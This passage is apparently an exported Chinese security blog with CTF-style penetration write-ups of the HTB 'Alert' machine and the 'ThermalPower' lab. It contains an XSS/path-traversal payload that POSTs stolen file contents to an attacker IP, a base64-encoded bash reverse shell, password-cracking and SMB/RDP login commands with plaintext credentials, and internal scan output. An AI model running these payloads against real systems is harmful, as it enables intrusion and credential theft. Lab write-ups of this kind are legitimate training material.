class="line"></span><br><span class="line">ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-<span class="number">20000.</span>txt -u http:<span class="comment">//alert.htb/ -H &quot;Host:FUZZ.alert.htb&quot; -fc 301</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734012003966-f4dc5256-4552-438b-b686-6dc07c8e4ab3.png"></p><p>æ‰«æåˆ°ä¸€ä¸ªå­åŸŸååŒæ ·ä¹ŸåŠ å…¥åˆ°hostsé‡Œé¢ã€‚</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>ä¸‹é¢æ‰“å¼€ä¸»é¡µé¢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015219181-fa72cdbd-36f9-4575-8183-a8f036c407fe.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªä¸Šä¼ mdçš„é¡µé¢æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°xss</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015248168-729e9cb2-ca50-4ac5-a395-769ea386affa.png"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»è§¦å‘äº†xssã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015296663-1ab21cd0-e12f-46ac-b7cb-cd5b1640f9f3.png"></p><p>åŒæ—¶åœ¨ä¸Šä¼ é¡µé¢ä¸­æœ‰ä¸€ä¸ªåˆ†äº«ä¸Šä¼ çš„é“¾æ¥çš„æŒ‰é’®çŒœæµ‹æ˜¯å¯ä»¥å‘é€</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015330910-ded2653b-909b-42d7-8f32-8b577473903f.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå‘é€é¡µé¢æŠ“åŒ…æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015356440-d8b2eb0e-4f23-41d0-8f14-a7b02c8381ca.png"></p><p>åœ¨è¿™é‡Œæ”¹æˆæˆ‘ä»¬è‡ªå·±ç›‘å¬çš„ipç«¯å£å¯ä»¥æ¥æ”¶åˆ°è¯·æ±‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734015399661-8fd6adf7-afb1-436a-bdf0-073d6f19e23a.png"></p><p>æ‰€ä»¥å¯ä»¥æ¨æµ‹æˆ‘ä»¬å‘é€çš„é“¾æ¥åå°ä¼šç‚¹æœºè¯¥é“¾æ¥</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ€è·¯ï¼šé¦–å…ˆï¼Œä¸Šä¼ å¸¦æœ‰æ¶æ„<code>js</code>ä»£ç çš„<code>md</code>æ–‡ä»¶ï¼Œå‘ç®¡ç†å‘˜å‘é€è¯¥<code>md</code>æ–‡ä»¶çš„é“¾æ¥ï¼Œè¯±å¯¼ç®¡ç†å‘˜è®¿é—®è¯¥<code>md</code>é¡µé¢ï¼Œå½“ç®¡ç†å‘˜è®¿é—®äº†ä¸Šä¼ çš„<code>md</code>æ–‡ä»¶æ—¶ï¼Œ<code>md</code>å¤¹å¸¦çš„æ¶æ„<code>js</code>ä»£ç å·¥ä½œï¼Œä»ç®¡ç†å‘˜çš„å®¢æˆ·ç«¯å‘èµ·å¯¹<code>http://alert.htb</code>çš„è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚è·å¾—çš„å“åº”å†…å®¹å‘é€è‡³æˆ‘ä»¬çš„æ”»å‡»æœºã€‚</p><p>ä¸åŒä¸å…¶ä»–<code>xss</code>çªƒå–<code>cookie</code>çš„æ€è·¯ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†çœ‹åˆ°ä¸€äº›åªæœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½çœ‹è§çš„ãŠ™ï¸ğŸ¯ä¸œè¥¿ã€‚</p><p>ç¼–å†™å¹¶ä¸Šä¼ æ¶æ„<code>md</code>æ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018247182-761d6f1c-42ed-4744-9c16-511c6fd795bf.png"></p><p>è¿™æ®µä»£ç çš„æ„æ€å¯ä»¥è‡ªè¡ŒæŸ¥çœ‹gptçš„è§£é‡Šå°±æ˜¯å®¢æˆ·ç«¯ä¼šè¯·æ±‚alert.htbè¿™ä¸ªåŸŸåç„¶åå°†è¿”å›çš„textå‘é€åˆ°æˆ‘ä»¬ç›‘å¬çš„1234ç«¯å£ä¸Š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734018705149-4afe640b-957d-42aa-b5f4-ab7ac8cc44e9.png"></p><p>å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ªmessageså‚æ•°</p><p>åœ¨æ·±å…¥åˆ©ç”¨ä¸€ä¸‹åªéœ€è¦å°†index.php?page&#x3D;messagesåŠ åˆ°urlå‚æ•°åé¢åœ¨å‘é€ä¸€éè§¦å‘ä¸€éxsså°±å¯ä»¥å¾—åˆ°å›æ˜¾</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734022833362-579d728d-8292-4bf0-a0a0-f3d0f59d552b.png"></p><p>è¿™é‡Œåœ¨é‡å¤ä¸Šä¸€æ­¥æ“ä½œå¯ä»¥å¾—åˆ°å›æ˜¾è¯»å–åˆ°å†…å®¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734023123154-2a212eac-8797-4d6b-998a-313a34cb5f86.png"></p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ˜¯èƒ½å¤Ÿæƒ³åˆ°ä»–æ˜¯æœ‰æ–‡ä»¶åŒ…å«è¯»å–åŠŸèƒ½çš„ï¼Œè¿™é‡Œæˆ‘å°±ä¸è®°å½•è¸©å‘çš„è¿‡ç¨‹äº†ï¼Œè¯»å¸¸è§„çš„&#x2F;etc&#x2F;passwdæ˜¯è¯»ä¸åˆ°çš„ï¼Œè¿™é‡Œéœ€è¦äº†è§£ä¸‹htpasswdæ–‡ä»¶</p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/cunjiu9486/article/details/109071899">https://blog.csdn.net/cunjiu9486/article/details/109071899</a></p><p><code>apache2</code>ç½‘é¡µè®¤è¯çš„å¯†ç ä¸€èˆ¬å­˜åœ¨<code>.htapasswd</code>ä¸­ã€‚æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯å»æ„é€ è¯»å–è¿™ä¸ªæ–‡ä»¶è·å–è´¦æˆ·å¯†ç äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#####asasdfasdf</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">&quot;http://alert.htb/messages.php?file=../../../../../../etc/apache2/sites-available/000-default.conf&quot;</span>)</span><br><span class="line"></span><br><span class="line">.then(response =&gt; response.text())</span><br><span class="line"></span><br><span class="line">.then(data =&gt; fetch(<span class="string">&quot;http://10.10.16.32:1234&quot;</span>, &#123;</span><br><span class="line"></span><br><span class="line">method: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line"></span><br><span class="line">body: data</span><br><span class="line"></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065054504-18183843-5f31-4463-87f0-355fc99e587a.png"></p><p>å·²ç»ä¼ ä¸Šå»è§£æåˆ°äº†ã€‚ä¸‹é¢å°±æ˜¯å‘é€xssè§¦å‘ä¸€ä¸‹äº† <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065204080-5da90bb8-1436-4a84-8d65-8898b3ec9ec0.png"></p><p>è§¦å‘æˆåŠŸï¼Œå‘ç°äº†htpasswdçš„å­˜æ”¾è·¯å¾„&#x2F;var&#x2F;www&#x2F;statistics.alert.htb&#x2F;.htpasswdï¼Œæ‰€ä»¥ç»§ç»­é‡å¤ä¸Šä¸€ä¸ªæ­¥éª¤ç»§ç»­é‡æ”¾</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734065779352-79a0726f-874a-4118-93b5-a91ad9984c90.png"></p><p>è¯»åˆ°äº†ä¸€ä¸ªåŠ å¯†çš„å¯†ç </p><p>ä½¿ç”¨jhonçˆ†ç ´ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-<span class="type">long</span> alert.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hashcat</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hashcat -m <span class="number">1600</span> -a <span class="number">0</span> passwd ~/Documents/rockyou.txt --username --show</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066195390-204e6dbb-79d5-442a-9373-f571c6698cca.png"></p><p>è¿˜éœ€è¦showä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">john --show alert.hash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734066330579-398f2598-c9e7-42d0-8024-bc968ae7dd5d.png"></p><p>ç„¶åsshè¿æ¥å³å¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734068966585-494fa4f9-0229-48f3-9418-bf97f9009ee5.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069006557-e05e3fef-ce0d-4213-b8a8-1dd19c9362d1.png"></p><p>å‘ç°æœ‰ä¸€ä¸ª8080ç«¯å£å¼€ç€ï¼Œè¿™æ ·çš„è¯å°±å°†è¯¥ç«¯å£è½¬å‘ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ssh -L <span class="number">8080</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> albert<span class="meta">@alert</span>.htb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069898682-dbb24f6a-1545-4c6c-8b4e-a1d696cb9229.png"></p><p>å»æ‰¾ä¸€ä¸‹è¿™ä¸ªwebsite monitoræ–‡ä»¶å¤¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069775933-fd693f4f-434a-4471-8444-37614e783bc3.png"></p><p>åœ¨optç›®å½•ä¸‹æœ‰ä¸€ä¸ªrootæƒé™çš„æ–‡ä»¶æ›¿æ¢ä¸€ä¸‹æ”¹æˆåå¼¹shellçš„è„šæœ¬å°±å¯ä»¥åå¼¹å›æ¥äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734069539804-cee036c2-79ee-424c-97af-c36b9cbc5c8f.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThermalPower</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/ThermalPower/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/ThermalPower/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ç›®å½•æ‰«æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610583467-430bbe2f-d9f7-4242-be54-8f958420b404.png"></p><p>æ‰«å‡ºæ¥ä¸€ä¸ªheadumpï¼Œç”¨å†…å­˜å·¥å…·åˆ†æä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610609384-10488334-2f25-4aee-a4ff-3a348f5aa7db.png"></p><p>æ‰¾åˆ°shiro keyç›´æ¥åˆ©ç”¨ä¸€æ³¢</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610631962-dbc2cbf0-0e32-437c-b1aa-dc78d25cb00c.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bash -c <span class="string">&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjMuMTIwLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹‹ååå¼¹shellæ‹¿åˆ°shellçœ‹ä¸‹ç½‘å¡ä¿¡æ¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734610659338-e86cef98-be5e-4748-803d-ebef09418c30.png"></p><h2 id="å†…ç½‘ä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¿¡æ¯æ”¶é›†</h2><p>ç„¶åä¸‹è½½fscanç›´æ¥æ‰«æä¸€æ³¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./fscan -h <span class="number">172.22</span><span class="number">.17</span><span class="number">.213</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">___ _</span><br><span class="line"></span><br><span class="line">/ _ \ ___ ___ _ __ __ _ ___| | __</span><br><span class="line"></span><br><span class="line">/ /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__| &lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\____/ |___/\___|_| \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fscan version: 1.8.4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(icmp) Target 172.22.17.6 is alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(icmp) Target 172.22.17.213 is alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:135 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:80 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.213:22 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:21 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.213:8080 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:445 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.17.6:139 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] alive ports len is: 7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetBios 172.22.17.6 WORKGROUP\WIN-ENGINEER</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetInfo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*]172.22.17.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]WIN-ENGINEER</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]172.22.17.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.17.213:8080 code:302 len:0 title:None è·³è½¬url: http://172.22.17.213:8080/login;jsessionid=8C8C2698165BC498428345B7768228CA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.17.213:8080/login;jsessionid=8C8C2698165BC498428345B7768228CA code:200 len:2936 title:ç«åˆ›èƒ½æºç›‘æ§ç”»é¢ç®¡ç†å¹³å°</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] ftp 172.22.17.6:21:anonymous</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]Modbus</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]PLC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]web.config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]WinCC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]å†…éƒ¨è½¯ä»¶</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]ç«åˆ›èƒ½æºå†…éƒ¨èµ„æ–™</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.17.6 code:200 len:661 title:172.22.17.6 - /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] PocScan http://172.22.17.213:8080 poc-yaml-spring-actuator-heapdump-file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] PocScan http://172.22.17.213:8080 poc-yaml-springboot-env-unauth spring2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 6/7 [-] ssh 172.22.17.213:22 root root_123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 6/7 [-] ssh 172.22.17.213:22 root 000000 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 6/7 [-] ssh 172.22.17.213:22 root 2wsx@WSX ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 6/7 [-] ssh 172.22.17.213:22 admin Admin@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 6/7 [-] ssh 172.22.17.213:22 admin 666666 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 6/7 [-] ssh 172.22.17.213:22 admin 1qaz!QAZ ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 7/7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] æ‰«æç»“æŸ,è€—æ—¶: 6m36.928867719s</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰netbioså¼€æ”¾æƒ³åˆ°å¯èƒ½ä¼šæœ‰rdp</p><h2 id="æ­å»ºä»£ç†"><a href="#æ­å»ºä»£ç†" class="headerlink" title="æ­å»ºä»£ç†"></a>æ­å»ºä»£ç†</h2><p>æ­å»ºä»£ç†è®¿é—®é‡Œé¢çš„ä¿¡æ¯ï¼Œè¿™é‡Œä½¿ç”¨frpè¿›è¡Œè®¿é—®å§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734611778092-5f757949-7c28-4c85-9f92-c766a3c84dee.png"></p><p>å¯ä»¥æˆåŠŸè®¿é—®åˆ°å†…ç½‘çš„ç½‘é¡µçœ‹ä¸€ä¸‹è¿™äº›æ•æ„Ÿä¿¡æ¯</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734611830045-44de8842-119b-4e7e-b095-17b76ca86324.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734617336939-3c74cc86-862b-48ba-836f-213a8d85c271.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734617357868-a9ea565a-c03c-4bda-991c-a9ce0feafb73.png"></p><p>ä½¿ç”¨chenhua chenhua@0813 å¯ä»¥ç™»å½•æˆåŠŸçˆ†ç ´ä¸€ä¸‹å°±å¯ä»¥äº†ä½¿ç”¨cme</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">crackmapexecÂ smbÂ <span class="number">172.22</span><span class="number">.17</span><span class="number">.6</span>Â -uÂ chenhuaÂ -pÂ chenhua@0813</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kali rdpå‘½ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">proxychains -q xfreerdp /u:chenhua /p:chenhua@0813 /v:<span class="number">172.22</span><span class="number">.17</span><span class="number">.6</span>:<span class="number">3389</span> +clipboard /drive:tmp,/tmp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯parallesclient</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614943779-5fbb5fb8-0fc3-452b-b286-d110e814148f.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734615054752-2e3de705-4329-47f9-8bb3-84bf52884d6b.png"></p><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·éƒ½æ˜¯å±äºbackupOperatorsç»„é‡Œçš„å¹¶ä¸”è¿™ä¸ªæœºå™¨ä¸å‡ºç½‘æ‰€ä»¥åªèƒ½ææƒï¼Œå‚è€ƒï¼š</p><p><a href="https://github.com/k4sth4/SeBackupPrivilege">https://github.com/k4sth4/SeBackupPrivilege</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734615826880-46932d3b-5796-487d-9a1c-55aeac3f9bce.png"></p><p>æ‹¿åˆ°flag</p><p>ç»§ç»­ç”¨fscanæ‰«æä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./fscan -h <span class="number">172.22</span><span class="number">.26</span><span class="number">.1</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">___ _</span><br><span class="line"></span><br><span class="line">/ _ \ ___ ___ _ __ __ _ ___| | __</span><br><span class="line"></span><br><span class="line">/ /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__| &lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\____/ |___/\___|_| \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fscan version: 1.8.4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(icmp) Target 172.22.26.11 is alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 